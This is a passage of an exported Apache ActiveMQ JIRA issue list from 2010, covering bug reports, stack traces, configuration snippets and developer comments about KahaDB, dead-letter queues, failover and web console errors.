	at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:94)
	at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:178)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:101)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154)
	at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112)
	at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1713)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:473)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
...

The problem is reproducible also reproducible with recent nightly builds of AMQ/Fuse 5.4.0.


-Tom","Red Hat Enterprise Linux, Kernel V2.6.18",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jun/10 11:35;tschoeftner;activemq.log;https://issues.apache.org/jira/secure/attachment/12461715/activemq.log","02/Jun/10 11:35;tschoeftner;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461717/activemq.xml","02/Jun/10 11:40;tschoeftner;wrapper.conf;https://issues.apache.org/jira/secure/attachment/12461718/wrapper.conf","02/Jun/10 11:35;tschoeftner;wrapper.log;https://issues.apache.org/jira/secure/attachment/12461716/wrapper.log",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74812,,,Tue Jun 22 00:00:07 UTC 2010,,,,,,,,,,,"0|i0rq8f:",159894,,,,,,,,,,,,,,,,,,,,,"02/Jun/10 11:35;tschoeftner;Attachd AMQ / wrapper logs and amq config;;;jira-users","02/Jun/10 11:40;tschoeftner;attached wrapper config;;;","10/Jun/10 05:27;tschoeftner;The problem is related to the VMQueueCursor being active.
If the queues are switched back to the default queue cursor, AMQ starts up smoothly.
However, the behaviour is strange as AMQ is nowhere near it's memory limits when it crashes.;;;","22/Jun/10 00:00;chirino;Just committed a fix that should resolved the issue reported here.  

Fixed in rev 956741 on trunk.  Try it out in a subsequent snapshot.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persistent  DLQ messages are NOT persisting in the DB,AMQ-2756,12483472,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,kseelam,kseelam,01/Jun/10 21:30,02/Sep/10 07:55,14/Jul/23 05:43,02/Sep/10 07:55,5.3.1,5.3.2,,,,5.4.0,,,Broker,,,,1,,,,,,,,,"We are using ActiveMQ 5.3.2  and defined persistence adaptor as below:
 
  <persistenceAdapter>
                <jdbcPersistenceAdapter dataSource=""#mysql-ds""/>
        </persistenceAdapter>

Once the producer sends persistent messages, they are  persisting FINE in the 'activemq_msgs' table in the DB (verified by select statement). We also see the messages thru the Web console.

While Consuming, after 6 failure read attempts;
 When we check the web Console; the messages are moved from our Queue to  ""ActiveMQ.DLQ""  queue.
BUT when we check the DB, the messages are NOT exist in the 'activemq_msgs' table. They are removed completely.  We expect those need to be exist with the  container name ""queue://ActiveMQ.DLQ"".

Since the DLQ messages are not persisted in DB,  We are loosing them for Broker restart.

This happens in 5.4-SNAPSHOT & 5.3.1 & 5.3.2 releases.
This works as expected in 5.3.0,  i mean, the DLQ messages are persisting in the permanent DB storage.

see this:
http://old.nabble.com/Dead-letter-queue-not-being-created-td28576004.html

Thank you,
Krishna. ","Windows Xp, Linux 2.6.18 (Red Hat 4.1.2-46)",mlayer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2800,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Jun/10 21:33;kseelam;TestDLQ.java;https://issues.apache.org/jira/secure/attachment/12461713/TestDLQ.java","01/Jun/10 21:33;kseelam;activemq_mysql.xml;https://issues.apache.org/jira/secure/attachment/12461714/activemq_mysql.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74813,,,Thu Sep 02 07:55:42 UTC 2010,,,,,,,,,,,"0|i0rq13:",159861,,,,,,,,,,,,,,,,,,,,,"01/Jun/10 21:33;kseelam;test class, broker activemq_mysql.xml files added;;;","02/Sep/10 02:45;michaelbeausoleil;Where can I download version 5.4.1 so I can get this fix?  

If version 5.4.1 is not available yet can you tell me how to get this fix in the 5.3.2 or 5.4.0 version as we are currently using the 5.3.2 version and this will be causing us some headaches.


Thanks.;;;","02/Sep/10 07:54;gtully;Note the workaround: disable the audit for the JDBC persistence adapter. Full fix is in 5.4.0;;;","02/Sep/10 07:55;gtully;This issue is resolved by the duplicate AMQ-2800;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Durable Subs repeated drain and reconnect, skipping messages with kahaDB",AMQ-2755,12483246,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/Jun/10 17:27,01/Jun/10 17:28,14/Jul/23 05:43,01/Jun/10 17:28,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"With kahaDB as the default store some of the durable tests fail. The issue is the next message sequence gets out of sync when a durable sub is repeatedly drained such that an new message can be incorrectly seen as an ack. A consumer can miss a message as a result.

Tests that fail: org.apache.activemq.usecases.DurableConsumerCloseAndReconnectTest.testCreateDurableConsumerCloseThenReconnect
 org.apache.activemq.network.SimpleNetworkTest.testDurableStoreAndForwardReconnect
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74814,,,Tue Jun 01 17:28:51 UTC 2010,,,,,,,,,,,"0|i0rqmf:",159957,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"01/Jun/10 17:28;gtully;resolved in r950171;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Spring && DefaultMessageListenerContainer && JmsTemplate && maxMessagesPerTask == 1 && Network of Brokers && maxConcurrentConsumer > 1 == Crumple,AMQ-2754,12483249,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,31/May/10 12:10,31/May/10 14:08,14/Jul/23 05:43,31/May/10 14:08,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Using test case from http://mail-archives.apache.org/mod_mbox/activemq-users/201005.mbox/%3Cg2v4e6f67721005071419u5ca08751h569775ee4e682c5e@mail.gmail.com%3E

problem seems to be with conduit subscription removal, it is not taking account of dependent subscriptions. Test case was great. thanks.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74815,,,Mon May 31 14:08:53 UTC 2010,,,,,,,,,,,"0|i0rqfj:",159926,,,,,,,,,,,,,,,,,,,,,"31/May/10 14:08;gtully;fix committed in r949742;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message is delivered to DLQ in store and forward mode if two brokers clock is not in sync,AMQ-2752,12483256,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,qingyi,qingyi,26/May/10 20:23,27/May/10 19:55,14/Jul/23 05:43,27/May/10 15:24,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"I have two ActiveMQ running on two separated machines.  They use duplex network connector between them.    I am using camel InOut Pattern to send message cross these two brokers.    The InOut request timeout is 20 seconds.    If these two broker machines' clock is NOT in sync, at least the destination broker clock is more than 20 seconds ahead of the sender broker's clock,   when the message gets on destination broker side,  it is being delivered to DLQ right away.    I am not sure if there is a way to avoid this problem.  Or it just works as designed.","Windows 2003 Server,  ActiveMQ 5.3.1,  Camel 2.2.0 and Jboss 4.2.2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74816,,,Thu May 27 19:55:48 UTC 2010,,,,,,,,,,,"0|i0rqh3:",159933,,,,,,,,,,,,,,,,,,,,,"27/May/10 08:30;gtully;it is working as designed. 
The feature that helps work around this issue is http://activemq.apache.org/timestampplugin.html but if possible, use some OS level protocol to keep the system clocks in sync on each of the machines.;;;","27/May/10 14:27;qingyi;I did tried ""timestampplugin"",  but it didn't solve the problem in this case.   I think it is because the plugin is mainly for the leg between jms client and broker.    My case is the leg between two brokers.     Yeah, we are seeking OS level protocol to keep clocks in sync to resolve this issue.;;;","27/May/10 15:06;gtully;ah, you may need to provide your own variant of the timestamp broker plugin, it is quite simple. Currently, it does not work if a message has come from a network which is your use case. not sure why that is, I think that should be made optional. In the code it has{code}if (message.getTimestamp() > 0
            && (message.getBrokerPath() == null || message.getBrokerPath().length == 0)) {
            // timestamp not been disabled and has not passed through a network{code}. which ensures it does not work for your use case atm.;;;","27/May/10 15:24;gtully;in r948858, added processNetworkMessages attribute (default false) to TimeStampBrokerPlugin to allow it to modify network messages. ;;;","27/May/10 19:55;qingyi;Tested with r948858,  it works now.  Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
session.recover does not result in repeated redelivery - duplicate is detected and auto-acked in error,AMQ-2751,12483262,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,26/May/10 13:25,04/Sep/19 11:16,14/Jul/23 05:43,26/May/10 14:55,5.3.1,5.3.2,,,,5.4.0,,,Broker,,,,0,,,,,,,,,see test case. calling recover form message listener with redelivery delay will result in auto ack of duplicate message so it disappears in error.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-7298,,,,,"26/May/10 13:28;gtully;amq2751-testcase.patch;https://issues.apache.org/jira/secure/attachment/12461712/amq2751-testcase.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74817,,,Wed May 26 14:55:31 UTC 2010,,,,,,,,,,,"0|i0rqgf:",159930,,,,,,,,,,,,,,,,,,,,,"26/May/10 13:28;gtully;Test case that demonstrates the issue with repeated calls to recover. with debug logging the auto ack in error can be seen;;;","26/May/10 14:55;gtully;resolved in r948463 ; duplicate suppression needs a rollback when delivery is paused due to redelivery delay as it will get redelivered in time.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB rollback fails when connection is closed afterwards,AMQ-2746,12483719,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,lphorne,lphorne,24/May/10 14:03,23/Sep/11 22:24,14/Jul/23 05:43,23/Sep/11 22:24,5.3.0,5.3.1,5.3.2,,,5.5.0,,,Message Store,,,,3,,,,,,,,,"KahaDB appears to not correctly handle rollback of a transacted session(Session.SESSION_TRANSACTED, transacted = true), when the session and connection is closed immediatly afterwards. 

The messages are either being automatically committed or have been lost.
The rollback functionality on its own works correctly, its just the step of closing all our connections which must be applying unexpected behavior.

Switching to AMQ persistance adapter does not have this issue and will roll back the messages succesfully.

Attached is a class that demonstrates this behavior, and the activemq configuration file used in a 5.3.2 activeMQ instance

General Test Case Flow
--------------------------------------------------------
-Receives 5 messages on the OnMessage() method
-call session.commit()
-Receives 5 messages on the OnMessage() method
-set messagelistener(null)
-call connection.stop()
-call session.rollback()
-call session.close()
-Set up connection and consumer to same durable subscriber
-Confirm whether the messages have been rolled back succesfully when we receive the next 5 messages.

If the Test Case fails on rollback it will display the following message to the console for each message.
""ERROR: Failed Rollback expected version:2 actual version:3 on message:0""

Test Case Setup
------------------------------------------------------
-Zipped the eclipse project folder containing this test case
-Ensure the ""CONNECTION"" static string in ActiveMQTest.java will point to your running ActiveMQ instance.
-Run the ActiveMQTest main() method.

Have not tested in versions below 5.3.0


","Windows XP SP3
Sun JVM 1.5",angelo.rosenfelder,cgsmithe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/May/10 14:07;lphorne;KahaDBRollback.zip;https://issues.apache.org/jira/secure/attachment/12461705/KahaDBRollback.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46495,,,Fri Sep 23 22:24:18 UTC 2011,,,,,,,,,,,"0|i0akfj:",59583,,,,,,,,,,,,,,,,,,,,,"07/Apr/11 12:20;lphorne;This test case now passes in the recently released 5.5.0 .;;;","23/Sep/11 22:24;tabish;User reports issue is resolved in 5.5.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pure master/slave configuration will not failover to slave when master fails ,AMQ-2743,12483744,12482973,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,bsnyder,bsnyder,20/May/10 04:46,28/Oct/11 08:04,14/Jul/23 05:43,28/Oct/11 08:04,5.3.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"When using a pure/master slave configuration in ActiveMQ 5.3.1 and the master is killed, the failover to the slave never takes place. 

Below is a description of the topology being used: 

* The producer sends messages to brokerA 
* BrokerA has a uni-directional network connection using the failover transport to brokerB-master and brokerB-slave 
* BrokerB-master and brokerB-slave each have a uni-directional network connection using failover to brokerA 
* The consumer uses a failover connection to brokerB-master and brokerB-slave 

Below are the steps to reproduce the problem: 
# In terminal one, start up brokerA 
# In terminal two, start up brokerB-master 
# In terminal three, start up brokerB-slave 
# In terminal four, start up the consumer that connects to brokerB-master and brokerB-slave  
# In terminal five, startup the producer that connects to brokerA to send messages 
# In terminal two, kill brokerB-master 
# Notice that the producer will continue sending messages until producer flow control kicks in and blocks the send operation, but brokerB-slave never takes over 

I copied the same exact configuration files over to instances of ActiveMQ 5.3.0 and it works without a problem. There must be something in ActiveMQ 5.3.1 that is causing this issue. ",,kevan,scotte,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/May/10 04:47;bsnyder;activemq-brokerA.xml;https://issues.apache.org/jira/secure/attachment/12461701/activemq-brokerA.xml","20/May/10 04:47;bsnyder;activemq-brokerB-master.xml;https://issues.apache.org/jira/secure/attachment/12461702/activemq-brokerB-master.xml","20/May/10 04:47;bsnyder;activemq-brokerB-slave.xml;https://issues.apache.org/jira/secure/attachment/12461703/activemq-brokerB-slave.xml",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44142,,,Fri Oct 28 08:04:02 UTC 2011,,,,,,,,,,,"0|i0agzz:",59027,,,,,,,,,,,,,,,,,,,,,"20/May/10 04:47;bsnyder;Attaching the three config files needed to reproduce the problem. ;;;","07/Apr/11 21:07;scotte;We have seen this same thing. Everything was fine in 5.3.0, but unable to failover to slave in 5.4.2. This is a serious issue - we cannot rollback to 5.3.0 due to other bugs, fixed in later versions - and we can not deploy a fault-tolerant configuration on a newer version, because of this bug.;;;","08/Apr/11 09:41;gtully;NetworkConnectors and the failover transport can work against each other as they both do retries to reconnect on failure.
When failover is used with a network connector, the failover transport needs to propagate a failure such that the network bridge can be recreated. To achieve this you need to provide maxReconnectAttempts=1. In this way, failover is used to choose the uri to connect to, but when it fails it lets the network connector know such that it can retry creating the bridge.

To determine if this is the problem, replace the use of network connector with failover (uri1, uri2) with two network connectors, one to uri1 and the other to uri2.;;;","08/Apr/11 18:25;scotte;Interesting, and very useful information, thank you!;;;","13/Apr/11 00:25;scotte;For what it's worth we carefully retested our failover scenarios after carefully checking configurations in 5.4.2 and can not reproduce the issue any longer. Our current configuration has two bridged AMQ networks. The configuration that seems to work for us is primary/backup with shared disk in each network. Our bridges use a static: connector with both uplink AMQ servers listed (note *not* failover: as that does not work properly). Since only the primary or the backup server is alive at any given time, this works. Our clients all use a failover: connector with ?updateURIsSupported=false to make sure they only talk to their proper network. We didn't do anything with maxReconnectAttempts...;;;","28/Oct/11 08:04;gtully;The updates in AMQ-3542 identify the only supported use case where failover: and static: discovery work together.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException in Web Console when using an existing browser session with a restarted broker instance,AMQ-2740,12483947,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,adrian.trenaman,adrian.trenaman,19/May/10 08:58,06/Dec/12 20:37,14/Jul/23 05:43,06/Dec/12 20:37,5.3.2,,,,,5.8.0,,,Broker,,,,1,,,,,,,,,"As per summary above. If you have a browser open to the web console, and create a queue it works OK. However, if you then restart the broker adn then try and perform an action like deleting the queue (from the web console) then you'll see the NPE in the broker's log. 

{code}
ERROR | Nested in org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.NullPointerException:
java.lang.NullPointerException
        at org.apache.activemq.web.handler.BindingBeanNameUrlHandlerMapping.getHandlerInternal(BindingBeanNameUrlHandlerMapping.java:57)
        at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:184)
        at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1057)
        at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:854)
        at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:807)
        at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:571)
        at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:501)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093)
        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
        at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
        at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
        at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)
        at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
        at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
        at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)
        at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)
        at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:206)
        at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)
        at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
        at org.mortbay.jetty.Server.handle(Server.java:324)
        at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)
        at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828)
        at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)
        at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)
        at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)
        at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)

{code} 

I think this has something to do with stale session secrets, and is a consequence of support that was put in to protect ActiveMQ against CSRF (cross-site request forgery) attacks. The original CSRF error was alarming; this error, however, is a plain old NPE and we should fix it.",Windows,adrian.trenaman,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44143,,,Thu Dec 06 20:37:42 UTC 2012,,,,,,,,,,,"0|i0aldz:",59738,,,,,,,,,,,,,,,,,,,,,"19/May/10 09:00;adrian.trenaman;Just another note on this - if you explicitly refresh the browser page before you do a delete, then the error goes away. This supports my suspicion about this being down to stale session information. ;;;","06/Dec/12 20:37;tabish;Fixed the NPE, will log a scary possible CSRF warning now instead. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contradictory documentation on default dispatchAsync value,AMQ-2739,12483271,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,scotte,scotte,19/May/10 00:39,19/May/10 15:47,14/Jul/23 05:43,19/May/10 08:36,,,,,,5.4.0,,,Documentation,,,,0,,,,,,,,,"The page http://activemq.apache.org/consumer-dispatch-async.html states:

""The default setting is dispatchAsync=true""

However, the page http://activemq.apache.org/destination-options.html shows:

consumer.dispatchAsync	 false (Default Value)

Which is the actual default setting?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74820,,,Wed May 19 15:47:41 UTC 2010,,,,,,,,,,,"0|i0rr8n:",160057,,,,,,,,,,,,,,,,,,,,,"19/May/10 08:36;gtully;default is true, fixed that wiki page. thanks.;;;","19/May/10 15:47;scotte;Thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB lock timeout should be configurable.,AMQ-2738,12483935,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,adrian.trenaman,adrian.trenaman,18/May/10 17:21,16/Jun/10 10:19,14/Jul/23 05:43,16/Jun/10 10:19,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"The timeout for KahaDB acquiring a lock on the file store is 10seconds - surely this should be configurable! The AMQ Persistence Adaptor store was pretty much immediate in it's take up on failover from master to slave; with the hard-coded 10 second delay in KahaDB it can take too long to failover.

Thoughts? ",,adrian.trenaman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74821,,,Wed Jun 16 10:19:46 UTC 2010,,,,,,,,,,,"0|i0rq1b:",159862,,,,,,,,,,,,,,,,,,,,,"16/Jun/10 10:19;rajdavies;Fixed by SVN revision 955179 - added property databaseLockedWaitDelay on to KahaDBPersistenceAdapter with a default of 10000 ms;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB doesn't clean up old files,AMQ-2736,12483957,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,adrian.trenaman,adrian.trenaman,18/May/10 09:38,02/Feb/15 13:07,14/Jul/23 05:43,17/Feb/11 18:11,5.3.2,,,,,5.5.0,,,,,,,12,,,,,,,,,"Over time, we're seeing that kahadb doesn't clean up old journal files. As a result, we eventually run out of disk space, or rather, we hit our usage limits and our producers are slowed down by the producer flow control mechanism. Others have experienced this problem too (for example, see http://mail-archives.apache.org/mod_mbox/activemq-users/201002.mbox/%3C27502591.post@talk.nabble.com%3E)

For now, we're moving back to the old amqPersistenceStore. 

